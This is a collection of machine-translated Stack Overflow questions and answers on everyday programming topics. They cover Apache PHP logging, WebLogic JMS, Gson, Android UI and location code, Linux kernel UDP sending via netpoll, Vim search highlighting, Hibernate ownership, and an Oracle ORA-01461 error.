然后重新启动网络服务器。这应该会给您该文件的 PHP 错误，并且只有 PHP 错误。当然，前提是脚本不是为了消除所有错误而编写的。

要在 Apache 中执行此操作，您可以使用 SetEnvIf 将环境变量添加到任何以 PHP 结尾的请求，然后使用该特定环境变量打印所有日志。例如：

```
SetEnvIf Request_URI "\.php$" phplog
CustomLog /path/to/php.log env=phplog 
```

要在多个文件夹中使用它，请为每个文件夹创建一个环境变量，每个文件夹创建一个 CustomLog，如下所示：

```
SetEnvIf Request_URI "/folder1/.*\.php$" log_folder1
Customlog /path/to/folder1/php.log env=log_folder1

SetEnvIf Request_URI "/folder2/.*\.php$" log_folder2
Customlog /path/to/folder2/php.log env=log_folder2 
```***

# jms - 来自多个提供者 URL 的 Weblogic JMS 消费

> ID：10499833
> 
> 赞同：0
> 
> 时间：2012-05-08T13:43:23.503
> 
> 标签：jms, weblogic

我们有一个带有 2 个 jms 服务器的集群 weblogic 10.3.4 域——每个服务器都在一个模块中部署了一个 UDQ。在任何给定时间，这些队列中只有一个拥有大约 5000 条 jms 消息（假设数）。

在消费者方面，我们有客户端代码连接到这些队列以使用所有 5000 条消息。此代码的工作方式是使用逗号分隔的 t3 提供程序 url 列表。这里的问题是，如果客户端连接到没有消息的 jms 服务器，它认为没有要处理的消息。

是否有配置设置或代码逻辑可用于连接到所有提供者并以 100 条为一组使用消息，直到没有队列留下消息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:46:19.670

这比你想要的更暴力，但你可以：

1.  获取 t3 连接 url 字符串的副本。
2.  针对 t3 url 执行正常连接。如果它跳过前*n 个*url，则意味着它们离线。
3.  使用来自连接的所有消息。
4.  断开。
5.  删除您刚刚连接的 url，以及它之前的所有 url。
6.  如果还有任何 url，请转到 #2。否则，转到#1。

一些额外的考虑：

*   您可能想在 #6 之后添加一个暂停。
*   只需为列表中的每个 URL 获取一个连接，并为每个 URL 启动一个消息侦听器。

# android - 设置铃声音量的哔声

> ID：10499838
> 
> 赞同：0
> 
> 时间：2012-05-08T13:43:36.980
> 
> 标签：android

我需要使用设置的音量 STREAM_RING 发出哔声。

我看到了 ToneGenerator 类，但是，在构造函数中，这个类没有收到 AudioManager.STREAM_RING 的音量......

在我的设备中，音量范围是 1-7。

谁能帮我？

谢谢，马特乌斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-13T11:44:35.183

这将产生最大音量的音调。

```
ToneGenerator toneGenerator= new   ToneGenerator(AudioManager.STREAM_DTMF,ToneGenerator.MAX_VOLUME);
    //this will play tone for 2 seconds.
toneGenerator.startTone(ToneGenerator.TONE_DTMF_1, 2000); 
```

# cnc - 需要的 FANUC GCODE 教程

> ID：10499840
> 
> 赞同：2
> 
> 时间：2012-05-08T13:43:44.983
> 
> 标签：cnc, g-code

G 代码是一种用于控制 CNC 机器（车床、铣床）的语言。

我有一个大学作业，我需要概念上的帮助。我遇到问题的部分工作是用 G 代码（Fanuc 公司方言）编写两个短程序。我有一个简短的关键字列表和一个示例程序，但这似乎不足以学习该语言。

从我的网上搜索，我发现G-code的各种方言是不兼容的。但是，我没有找到关于这个特定教程的教程。

此外，为给定的问题自动生成代码似乎不是一种选择，因为我怀疑在展示程序时会要求我解释程序的内部工作原理。此外，我大学的老师似乎非常坚持按照他们的方式做事，所以……我想我只需要学习该死的东西。

Q：在哪里可以找到G代码Fanuc方言的简明（我想花不超过2-3天的时间）教程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-04-05T22:21:22.820

我建议在[此处](http://linuxcnc.org/docs/html/gcode/g-code.html)或[此处](http://linuxcnc.org/docs/html/gcode/overview.html)查看 LinuxCNC 命令列表，以及 CAMotics 页面上的简明[版本](https://camotics.org/gcode.html)。Fanuc 兼容控件（例如 Haas、Mach3）的一些特殊点：

*   您可以在括号内添加注释。基本上里面的任何东西`(...)`都不会被执行。
*   你可以有参数/变量。例如，您可以通过以下方式将浮点值分配给`12.3`变量插槽`101``#101 = 12.3`
*   您可以调用这些变量，例如`X#101`等于`X12.3`
*   您可能有数学表达式，然后将值存储在另一个变量槽中。例如`#3 = [#1 + #2]`，但是您不能拥有`X = [#1 + #2]`或`X[#1 + #2]`。

[您可以在Benjamin Jurke的](https://twitter.com/BenjaminJurke)[这篇](https://wiki.shapeoko.com/index.php/Programmatic_G-Code_Generators)文章中找到更多深入的信息。

# java - Gson JsonObject 全局变量

> ID：10499846
> 
> 赞同：0
> 
> 时间：2012-05-08T13:44:07.600
> 
> 标签：java, json, gson

我正在使用 Gson API 并创建了一个类，如：

```
public class Person
{
   private String name;
   private JsonObject someInfo;

   public Person()
   {
   }
} 
```

当我使用以下方法重新实现此类的实例时：

```
Person person = new Person();
person.name = "Charles"
person.someInfo = new JsonObject();
person.someInfo.addProperty("key1","value1");
Gson gson = new Gson();
String jsonStr = gson.toJson(person); 
```

我在成员属性中获取信息：

```
{"members":{"name":"Charles","someInfo":{"key1":"value1"}}} 
```

我注意到，如果我将 Person 的类 someInfo 全局变量声明为 JsonElement 而不是 JsonObject，则信息将正确显示。

有什么方法可以使用 JsonObject 来实现信息？

我期望的是：

```
{"name":"Charles","someInfo":{"key1":"value1"}} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T04:43:41.960

我在使用 Gson 2.2.2 时遇到了同样的问题。

当我升级到 Gson 2.2.3 时，我在序列化 JsonObject 时得到了预期的 JSON。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:56:06.240

为您的 someInfo 使用地图：

```
public class Person
{
   private String name;
   private Map<Object, Object> someInfo;

   public Person()
   {
   }

}

Person person = new Person();
person.name = "Charles";
person.someInfo = new HashMap<Object, Object>();
person.someInfo.put("key1","value1"); 
```

`Person`尽管使用适当的 getter/setter 来访问变量会更好。

# c# - Metro 应用程序的 C# Visual Studio 11 中的事件处理程序错误

> ID：10499847
> 
> 赞同：2
> 
> 时间：2012-05-08T13:44:08.647
> 
> 标签：c#, windows-8

我正在使用 VisualStudio 11 beta 进行 Windows 8 Metro 应用程序开发，但出现错误。错误是：

```
Cannot implicitly convert type 
   'System.EventHandler<Windows.UI.Input.ManipulationStartedEventArgs>' to 
   'Windows.UI.Xaml.Input.ManipulationStartedEventHandler' 
```

我的代码是。

```
selectRectangle.ManipulationStarted += new EventHandler<ManipulationStartedEventArgs>(OnRectangleManipulationStarted);
ellipseTL.ManipulationStarted += new EventHandler<ManipulationStartedEventArgs>(OnRectangleManipulationStarted); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T14:01:17.020

我还没有为 Metro 使用过 VS 2012，但据我了解，Metro/.NET 4.5 对命名空间进行了一些重组，或者至少 selectRectangle/ellipseTL.ManipulationStarted 事件使用了不同的类。当然，在这种情况下，他们正在寻找一个`ManipulationStartedEventHandler`not an `EventHandler<>`。

试试这个：

```
selectRectangle.ManipulationStarted += new Windows.UI.Xaml.Input.ManipulationStartedEventHandler(OnRectangleManipulationStarted);
ellipseTL.ManipulationStarted += new Windows.UI.Xaml.Input.ManipulationStartedEventHandler(OnRectangleManipulationStarted); 
```

或者使用隐式事件处理程序语法：

```
selectRectangle.ManipulationStarted += OnRectangleManipulationStarted;
ellipseTL.ManipulationStarted += OnRectangleManipulationStarted; 
```

但就像我说的，我还没有使用新的 API，所以这只是我对 4.0 体验的最佳猜测。

编辑：您可能还需要更改 OnRectangleManipulationStarted 方法的签名以匹配 ManipulationStartedEventHandler 签名。

# android - android文件浏览器在网格视图中列出项目

> ID：10499851
> 
> 赞同：0
> 
> 时间：2012-05-08T13:44:18.400
> 
> 标签：android, gridview, file-browser

我想在我的应用程序中实现文件浏览器。我看到了文件浏览器的代码。但在所有这些示例中，dir /files 都被列为 lisrview。我想在我的应用程序中显示网格视图。文件夹/文件将在网格中列出。单击文件夹时，它将打开下一级网格。

我没有看到任何支持这一点的实现。如果您有任何参考，请分享

感谢您的时间和支持

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T12:57:10.177

在此处添加我的代码以供任何人将来参考

```
public class FileBrowserActivity extends Activity {
GridView gridView;

public static List<FileBrowserItem> gridItemsList;
public static String name;
String root;
String TAG= "FileBrowser";
public static boolean multiSelectFlag = false;
@Override
public void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    setContentView(R.layout.gridview);
     root = getIntent().getExtras().getString("rootpath");

    Log.i(TAG,"path:"+ root);

    getGridItemsList();
    gridView = (GridView) findViewById(R.id.gridView1);

    gridView.setAdapter(new FileBrowserGridViewAdapter(this));

}

private void getGridItemsList() {
    gridItemsList = new ArrayList<FileBrowserItem>();
     File file;
    file = new File(root);
    File list[] = file.listFiles();
    if(list.length == 0){
        Toast.makeText(getApplicationContext(), "Empty Folde", Toast.LENGTH_SHORT).show();
    }
    for (int i = 0; i < list.length; i++) {
        FileBrowserItem item = new FileBrowserItem();
        File temp_file = new File(file.getAbsolutePath(),list[i].getName());
        item.setPath( file.getAbsolutePath()+"/"+list[i].getName());
        item.setName(list[i].getName());
        //Log.i(TAG,i + item.value + item.name);
        if ( temp_file.listFiles() != null) {
            item.setType(FileBrowserItem.DIRECTORY_TYPE)  ;
        } else {
            item.setType(FileBrowserItem.FILE_TYPE)  ;
        } 
        gridItemsList.add(item);
    }

}
@Override
 public boolean onKeyDown(int keyCode, KeyEvent event) {
     if ((keyCode == KeyEvent.KEYCODE_BACK)) {
         root = new File(root).getParent();
         Log.i(TAG,"back"+root);
         getGridItemsList();
         finish();
         return true;
     } else {
         return super.onKeyDown(keyCode, event);
     }
 } 
```

}

```
public View getView(final int position, View convertView, ViewGroup parent) {

    ViewHolder holder;
    if (convertView == null) {
        LayoutInflater mInflater = (LayoutInflater) mContext
                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        convertView = mInflater.inflate(R.layout.grid_item, null);
        holder = new ViewHolder();
        holder.text1 = (TextView) convertView
                .findViewById(R.id.grid_item_label);
        holder.image = (ImageView) convertView
                .findViewById(R.id.grid_item_image);
        holder.checkBox= (CheckBox) convertView
                .findViewById(R.id.checkBox);

        holder.image.setOnClickListener(new View.OnClickListener() {

            public void onClick(View view) {
                Log.d("onClick", "position [" + position + "]");

                if (FileBrowserActivity.gridItemsList.get(position)
                        .getType() == FileBrowserItem.DIRECTORY_TYPE) {
                    Intent intent = new Intent(mContext,
                            FileBrowserActivity.class);
                    intent.putExtra("rootpath",
                            FileBrowserActivity.gridItemsList.get(position)
                                    .getPath());
                    mContext.startActivity(intent);
                }
            }
        });
        convertView.setTag(holder);
    } else {

        holder = (ViewHolder) convertView.getTag();

    }
    Log.i(TAG, "Position" + position);
    Log.i(TAG, FileBrowserActivity.gridItemsList.get(position).getName());
    holder.text1.setText(FileBrowserActivity.gridItemsList.get(position)
            .getName());
    holder.image
            .setImageResource(getImageIcon(FileBrowserActivity.gridItemsList
                    .get(position).getType()));
    if(FileBrowserActivity.multiSelectFlag){
        holder.checkBox.setVisibility(View.VISIBLE);
    }
    else{
        holder.checkBox.setVisibility(View.GONE);
    }
    return convertView;
} 
```

# jboss - JBoss EAP 5.1.2 - 在资源上随机出现 404

> ID：10499852
> 
> 赞同：1
> 
> 时间：2012-05-08T13:44:23.953
> 
> 标签：jboss, http-status-code-404

这把我逼到了墙角。

我在 JBoss 服务器上部署了一个 Web 应用程序。该应用程序在大多数情况下都可以正常运行，但在没有警告的情况下随机地会突然在图像和 javascript 文件上抛出“404”，导致页面显示空白页面。问题一直存在，直到我重新启动 JBoss 服务。

用户需要先登录才能访问该页面，该页面仍然有效，但是当这种情况发生时，在登录后就没有任何效果。查源码和Firebug显示主登陆jsp检索到了，但是很多其他的404说找不到资源。

没有路径更改，也没有完成任何工作，该应用程序仍然可以在前一刻工作并在下一刻停止。日志文件在此时间段内没有显示任何特殊行为。

有什么可能导致这种情况的想法吗？如果您需要更多信息，我很乐意提供，因为我不确定从哪里开始寻找。

编辑：我注意到 404 文件都在我的 WAR 文件的子目录中。仍然可以检索的页面不包含在 war 文件的子目录中，但所有不可用的页面都在 /images 和 /javascript 等文件夹中。是否可能存在扫描仪故障？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-01T20:13:22.913

我将每个 jsp 文件的文件编码从 ISO-8859-1 更改为 UTF-8。

已经一个多星期了，这个问题还没有再次报告。希望这是解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T14:03:47.557

没有回答您的问题，只是提示：如果您购买了 EAP 许可证，您应该可以在[https://access.redhat.com](https://access.redhat.com)打开支持案例。

# c# - 电子邮件地址格式

> ID：10499853
> 
> 赞同：0
> 
> 时间：2012-05-08T13:44:25.653
> 
> 标签：c#, asp.net, sql-server-2008, web-scraping

我在 sql 表中有一个电子邮件地址，格式如下：

```
&#99;&#108;&#101;&#114;&#107;&#064;&#119;&#101;&#97;&#118;&#101;&#114;&#115;&#046;&#111;&#114;&#103;&#046;&#117;&#107; 
```

如何将其转换为正确的格式？

我看到它在网页上完美显示，但在其他任何地方都是这样。我假设它是用于转换的字母等 (html) 代码，但是如何使用正确的电子邮件更新我的表格？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:52:22.670

看看[HttpServerUtility.HtmlDecode](http://msdn.microsoft.com/en-us/library/system.web.httpserverutility.htmldecode.aspx)方法，您应该能够编写一个循环来处理您的所有数据或编写一个扩展存储过程并从 SQL 调用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:53:49.053

如果数量很少 - 您可以使用这样的工具： [http ://www.web2generators.com/html/entities](http://www.web2generators.com/html/entities)

您可以使用[http://www.lookuptables.com/](http://www.lookuptables.com/)上的信息编写代码以自行解码，或者像 Tony 建议的那样；采用`HttpServerUtility.HtmlDecode`

我不知道用 SQL 有什么好的方法 - 我会编写一个小应用程序来处理数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:53:50.770

如果您正在为这一记录寻找一次性修复：正如您所说，它在屏幕上正确显示，然后很酷：在任何屏幕上显示它，然后将该值复制并粘贴回数据库更新中，或者屏幕或一次性查询。

如果您的软件在保存到数据库之前将这些转义符放入电子邮件地址中，我会说：不要。这是一个坏主意，因为这样您就无法搜索或操作它。将所有值存储在“真实”文本中。在布局屏幕时进行 HTML 转义。实际上，在 ASP.NET 中，我认为大多数显示功能都会自动执行此操作；有些有标志告诉它不是 HTML 转义。

附录：我看到托尼的回答假设你所有的电子邮件地址都是这样的。这是正确的，还是只是一个？如果是全部，那么我对修复一个的建议是不切实际的，您确实想编写一个循环通过数据库并使用 HtmlDecode 修复它们的小程序。

# javascript - 填充 $.each(..) 可以“破坏”我的地图在 IE 中的顺序吗？

> ID：10499857
> 
> 赞同：1
> 
> 时间：2012-05-08T13:44:29.087
> 
> 标签：javascript, jquery, ajax, foreach

**我的问题：**

我知道这听起来可能很有趣，但这是我的问题：我有一个`select`通过 Ajax 以下列方式成功填充的内容：

```
$.each(data, function(key, value) {
            options += '<option value="' + key + '">' + value + '</option>';
        }); 
```

我的服务器返回一个**排序的地图**（按*值*排序）。一切正常，**但**在 Internet Explorer（7,8 和 9）中，选择显示为未排序。

**我发现了什么：**

我发现 IE 实际上显示它按`key`我传递给`value`参数的排序。我的列表在后端按 排序`value`，我想这样显示它（在 Chrome、Firefox 等上运行良好）。

我在想这种排序的原因很可能是`$.each`jQuery 函数。也许它正在按键迭代？不过，我不确定这一点，所以我希望得到一些反馈。另外，我怎样才能在地图上进行替代迭代，以确保这一点？我试图避免执行 jQuery 排序，因为排序是在后端完成的。

我提到我需要传递给我传递它们的方式`key`。`value``option`

**编辑 - 一个例子：**

应该如何（并且在 Chrome 和 Firefox 上）：

```
<option value="13">A</option>
<option value="2">B</option>
<option value="55">C</option> 
```

在 IE 中是怎样的：

```
<option value="2">B</option>
<option value="13">A</option>
<option value="55">C</option> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:50:41.237

您的问题是对象实际上没有键/值对的特定顺序。IE改变它并没有错。使用数组来保存对，例如：

```
[
    {
        "value": "13",
        "text": "A"
    },
    {
        "value": "2",
        "text": "B"
    },
    {
        "value": "55",
        "text": "C"
    }
] 
```

并循环如下：

```
$.each(data, function(index, option) {
    options += '<option value="' + option.value + '">' + option.text + '</option>';
}); 
```

最后，您不应该将 HTML 作为字符串来构建元素。使用 DOM。我想你有`someElement.html(options);`什么地方？相反， make`options = someElement;`并执行以下操作：

```
$.each(data, function(index, option) {
    options.append(
        $('<option>').prop('value', option.value).text(option.text)
    );
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:58:23.760

minitech是正确的。

假设订单将保留在对象中是多么好的，但不能保证，并且可能会在任何随机时间（或在 IE 中，一直）中断。

然而，另一种解决方案是传递一个排序数组，该数组具有您想要通过键的顺序。

```
[
  {
    13: 'A',
    2: 'B',
    55: 'C'
  },
  [ 13, 2, 55 ]
 ] 
```

# c# - Edmx .net 4.0 找不到指定的命名连接

> ID：10499858
> 
> 赞同：0
> 
> 时间：2012-05-08T13:44:32.533
> 
> 标签：c#, .net

**指定的命名连接在配置中未找到，不打算与 EntityClient 提供程序一起使用，无效。”**

我有一个工作**控制台**项目。但是，当我尝试将 exe 和 app.config（同一文件夹）复制到实时服务器时，它不起作用并出现以下错误。可能是域问题，还是某些设置？我很确定它可以访问数据库，因为我使用过其他项目，除了这次不同，因为我选择了 edmx。

```
<connectionStrings>
<add name="AdvWorksEntities" connectionString="metadata=res://*/GroupsModel.csdl|res: //*/GroupsModel.ssdl|res://*/GroupsModel.msl;provider=System.Data.SqlClient;provider connection string=&quot;Data Source=abcd;Initial Catalog=AdvWorks;Persist Security Info=True;User ID=user;Password=pass;MultipleActiveResultSets=True&quot;" providerName="System.Data.EntityClient" />
</connectionStrings> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:31:50.380

[解决方案](http://www.iktsoft.net/keiji-en/blog/10427)

*app.config 是项目中使用的文件名。但是，当它被编译时，文件名变成了应用程序的 exe 名称 + .config。例如，如果应用程序名称为“sample.exe”，则配置名称应为“sample.exe.config”。*

# java - 在 hql 中使用 POJO

> ID：10499861
> 
> 赞同：0
> 
> 时间：2012-05-08T13:44:36.010
> 
> 标签：java, hibernate, hql

是否可以使用多个 POJO 或 POJO 和来自一个 hql 语句的另一条数据的组合？例如：

如果我有 Foo 类：

```
public class Foo {
   private String name;
   private String type;

   public Foo (String name, String type) {
      this.name = name;
      this.type = type;
   }
} 
```

和实体吧：

```
@Entity
public class Bar {
  private Long id;
  private String name;
  private String type;
  ...
} 
```

以下 hql 将无法编译：

```
select bar.id, new Foo(bar.name, bar.type) from Bar bar 
```

就此而言，这个 hql 也不能编译。

```
select new list(bar.id, new Foo(bar.name, bar.type)) from Bar bar 
```

这应该工作吗？

谢谢

内塔

# linux - 从 Linux 内核发送 UDP 数据包

> ID：10499865
> 
> 赞同：16
> 
> 时间：2012-05-08T13:44:48.937
> 
> 标签：linux, linux-kernel, udp, kernel

即使已经存在类似的主题，但我注意到它可以追溯到两年前，因此我想重新打开一个更合适......

我试图弄清楚如何从 Linux 内核（3.3.4）发送 UDP 数据包，以监控随机数生成器（/drivers/char/random.c）的行为。到目前为止，由于 sock_create 和 sock_sendmsg 函数，我已经设法监控了一些事情。您可以在此消息的末尾找到我使用的典型代码。（您可能还想在[此处](http://dl.dropbox.com/u/6961623/random.c)下载完整修改后的 random.c 文件。）

通过将此代码插入到适当的 random.c 函数中，我可以为每次访问 /dev/random 和 /dev/urandom 以及随机数生成器用来收集熵的每个键盘/鼠标事件发送一个 UDP 数据包. 但是，当我尝试监视磁盘事件时，它根本不起作用：它在引导期间会产生内核恐慌。

因此，这是我的主要问题：*您知道为什么我的代码在插入磁盘事件函数时会引起这么多麻烦吗？*(add_disk_randomness)

或者，我读过 netpoll API，它应该处理这种内核中的 UDP 问题。不幸的是，除了 2005 年的一个非常有趣但过时的 Red Hat 演示文稿之外，我没有找到任何相关文档。*你认为我应该使用这个 API 吗？*如果有，你有什么例子吗？

任何帮助，将不胜感激。提前致谢。

PS：这是我在这里的第一个问题，所以如果我做错了什么，请不要犹豫，告诉我，我会记住它以备将来:)

* * *

```
#include <linux/net.h>
#include <linux/in.h>
#include <linux/netpoll.h>
#define MESSAGE_SIZE 1024
#define INADDR_SEND ((unsigned long int)0x0a00020f) //10.0.2.15
static bool sock_init;
static struct socket *sock;
static struct sockaddr_in sin;
static struct msghdr msg;
static struct iovec iov;

[...]

int error, len;
mm_segment_t old_fs;
char message[MESSAGE_SIZE];

if (sock_init == false)
{
  /* Creating socket */
  error = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
  if (error<0)
    printk(KERN_DEBUG "Can't create socket. Error %d\n",error);

  /* Connecting the socket */
  sin.sin_family = AF_INET;
  sin.sin_port = htons(1764);
  sin.sin_addr.s_addr = htonl(INADDR_SEND);
  error = sock->ops->connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr), 0);
  if (error<0)
    printk(KERN_DEBUG "Can't connect socket. Error %d\n",error);

  /* Preparing message header */
  msg.msg_flags = 0;
  msg.msg_name = &sin;
  msg.msg_namelen  = sizeof(struct sockaddr_in);
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_iov = &iov;
  msg.msg_control = NULL;
  sock_init = true;
}

/* Sending a message */
sprintf(message,"EXTRACT / Time: %llu / InputPool: %4d / BlockingPool: %4d / NonblockingPool: %4d / Request: %4d\n",
  get_cycles(),
  input_pool.entropy_count,
  blocking_pool.entropy_count,
  nonblocking_pool.entropy_count,
  nbytes*8);
iov.iov_base = message;
len = strlen(message);
iov.iov_len = len;
msg.msg_iovlen = len;
old_fs = get_fs();
set_fs(KERNEL_DS);
error = sock_sendmsg(sock,&msg,len);
set_fs(old_fs); 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-29T10:31:54.080

几个月前我解决了我的问题。这是我使用的解决方案。

标准的数据包发送 API (sock_create, connect, ...) 不能在少数情况下使用（中断）。在错误的地方使用它会导致 KP。

netpoll API 更加“低级”，适用于各种上下文。但是，有几个条件：

*   以太网设备
*   IP网络
*   仅 UDP（无 TCP）
*   发送和接收数据包的不同计算机（您不能发送给自己。）

请务必尊重他们，因为如果出现问题，您不会收到任何错误消息。它只会默默地失败:) 这是一些代码。

宣言

```
#include <linux/netpoll.h>
#define MESSAGE_SIZE 1024
#define INADDR_LOCAL ((unsigned long int)0xc0a80a54) //192.168.10.84
#define INADDR_SEND ((unsigned long int)0xc0a80a55) //192.168.10.85
static struct netpoll* np = NULL;
static struct netpoll np_t; 
```

初始化

```
np_t.name = "LRNG";
strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
np_t.local_ip = htonl(INADDR_LOCAL);
np_t.remote_ip = htonl(INADDR_SEND);
np_t.local_port = 6665;
np_t.remote_port = 6666;
memset(np_t.remote_mac, 0xff, ETH_ALEN);
netpoll_print_options(&np_t);
netpoll_setup(&np_t);
np = &np_t; 
```

采用

```
char message[MESSAGE_SIZE];
sprintf(message,"%d\n",42);
int len = strlen(message);
netpoll_send_udp(np,message,len); 
```

希望它可以帮助某人。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-14T20:23:39.497

启动期间的恐慌可能是由于您尝试使用尚未初始化的东西引起的。查看堆栈跟踪可能有助于弄清楚实际发生了什么。

至于您的问题，我认为您正在尝试做一件简单的事情，那么为什么不坚持使用简单的工具呢？;) printks 确实可能是个坏主意，但是试试 trace_printk。trace_printk 是 Ftrace 基础设施的一部分。

*以下文章中的使用 trace* _printk()部分应该会教您您需要知道的所有内容：http: [//lwn.net/Articles/365835/](http://lwn.net/Articles/365835/)

# vim - 在 Vim 中搜索和替换后取消选择匹配的字符串

> ID：10499866
> 
> 赞同：8
> 
> 时间：2012-05-08T13:44:49.647
> 
> 标签：vim

我有一个文件（LaTeX），其中包含我希望注释掉的行。
我在视觉选择相关块后使用的正则表达式是`:s/^/%/g`，它工作正常。但是，vim 会突出显示替换中使用的正则表达式的第一部分的每个匹配项，（突出显示每行开头的第一个字符）。

如果我进行另一次搜索或另一次搜索并替换，则选择会发生变化，但如果不进行“无用”搜索，我无法弄清楚如何将其关闭。

如果我搜索空格会特别烦人（因为`在文本文件中突出显示每个 ' ' 在视觉上很烦人）。`

 `搜索和替换完成后如何取消选择匹配的字符串？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-08T13:47:39.333

**`:nohlsearch`**将停止突出显示它，但将其保持为活动搜索模式。（它将开始在`n`等上突出显示）

**`:let @/=""`**将清除搜索模式寄存器（这样`n`等将不起作用）。

我在 Vim 中看到的一个常见的事情是`map <Leader><Space> :noh<CR>`；这导致（假设默认领导者，反斜杠）`\``Space`将停止突出显示当前匹配。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-08-25T13:48:50.053

只需搜索不在页面上的字符串：

```
/poop 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-08T13:47:14.060

`:nohlsearch`将从当前搜索中删除突出显示。突出显示将在您的下一次搜索中返回。

`:set nohlsearch`将禁用当前 vim 会话的突出显示。

如果您想完全禁用突出显示，请添加`:set nohlsearch`到您的`.vimrc`

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-08-20T10:30:42.620

将其添加到您的 vimrc，一旦完成 - 在我的情况下按 <,> + enter 停止突出显示

```
 map <silent> <leader><cr> :noh<cr> 
````

# android - 安卓定位监听器

> ID：10499870
> 
> 赞同：0
> 
> 时间：2012-05-08T13:45:04.307
> 
> 标签：android

我想从服务中获取位置并返回 null，我不知道可能是什么问题。下面是我的示例代码。

```
public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        locListener = new GpsLocationListener();
        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0,
                locListener);
        loc = locListener.getLocation();
        showMessage("Service started");
        if (loc != null) {
            latitude = String.valueOf(loc.getLatitude());
            longitude = String.valueOf(loc.getLongitude());
        }
        if (latitude != null && longitude != null) {
            connectWebservice();
        }
        Log.i("trackmeservice", "service started");
    } 
```

这里我的 loc 是空的。任何帮助将不胜感激；

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:48:19.253

只需检查您的 gps 和互联网是否正常工作。

向清单文件添加权限

```
 <uses-permission android:name="android.permission.INTERNET" />
 <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
 <uses-permission android:name="android.permission.CONTROL_LOCATION_UPDATES"/> 
```

应用程序标签上方

# hibernate - Hibernate 中的关系所有者是什么意思？

> ID：10499871
> 
> 赞同：8
> 
> 时间：2012-05-08T13:45:04.950
> 
> 标签：hibernate, hibernate-mapping

```
@Entity
public class Troop {
    @OneToMany(mappedBy="troop")
    public Set<Soldier> getSoldiers() {
    ...
}

@Entity
public class Soldier {
    @ManyToOne
    @JoinColumn(name="troop_fk")
    public Troop getTroop() {
    ...
} 
```

我正在努力处理这方面的文档：

```
Troop has a bidirectional one to many relationship with Soldier through the troop property. You don't have to (must not) define any physical mapping in the mappedBy side. 
```

因此，例如以下代码：

```
Troup t = new Troup();
t.getSoldiers().add(soldier); 
```

`session.saveOrUpdate(t)`如果我只是打电话，如果我只是 打电话会有什么区别`session.saveOrUpdate(s)`？MappedBy 将 troup 定义为所有者，但这具体是什么意思呢？因为我希望如果我保存了士兵对象，那么肯定会正确保存troop_fk 列吗？如果我只是保存 troup 对象，那么士兵外键在级联时肯定会正确更新吗？我真的看不出有什么区别。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-14T13:35:03.510

所有者是在刷新时在数据库中设置外键的实体。

编码：

```
Troup t = new Troup();
t.getSoldiers().add(soldier);
session.SaveOrUpdate(t);
session.Flush(); 
```

没有级联：

```
throws references transient instances 
```

具有级联和所有者 = 部队

```
INSERT INTO troops (id, ...) VALUES (1, ...)
INSERT INTO soldiers (..., troop_fk) VALUES (..., NULL)
UPDATE soldiers SET troop_fk=1    <- troop sets its key 
```

级联和所有者=士兵

```
INSERT INTO troops (id, ...) VALUES (1, ...)
INSERT INTO soldiers (..., troop_fk) VALUES (..., 1) <- soldier saves the reference 
```

# sql - 插入...选择 - 获取 ORA-01461：只能绑定 LONG 值以插入 LONG 列

> ID：10499878
> 
> 赞同：1
> 
> 时间：2012-05-08T13:45:16.793
> 
> 标签：sql, oracle, insert, prepared-statement

当我尝试执行以下语句时：

```
INSERT INTO myTable (id, some_data, more_data)             
SELECT ?, ?, ? FROM dual 
WHERE NOT EXISTS (
    SELECT 1 FROM myTable WHERE id = ?) 
```

我得到 ORA-01461: can bind a LONG value only for insert into a LONG column。

但是，当我将查询更改为：

```
INSERT INTO myTable (id, some_data, more_data)             
VALUE (?, ?, ?) 
```

使用*相同的值*，语句成功。

请注意，我的表包含 VARCHAR2 和 BLOB。但是这两个语句的值是相同的。

知道为什么原版失败了吗？

Edit1：评论者（Romain）和一位同事建议我使用 MERGE INTO 而不是 INSERT...SELECT...WHERE NOT EXISTS...。很好，我做到了 - 但它给了我同样的问题（ORA-01461 ……长……长）。

Edit2： BLOB 列上的 to_lob(?) 不能正常工作，给我“ORA-00932：不一致的数据类型：预期的 LONG BINARY 得到 BINARY”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T07:05:35.550

给我们一个带有价值观的例子。它适用于简单的值：

```
CREATE TABLE feed (Id NUMBER,   DATA VARCHAR2(30)  , data1 BLOB);
INSERT INTO feed VALUES (1, '1', '1');
INSERT INTO feed (id, DATA, data1)           
  SELECT 1, '1', '1' FROM dual  WHERE NOT EXISTS ( SELECT 1 FROM feed WHERE id = 1) ;
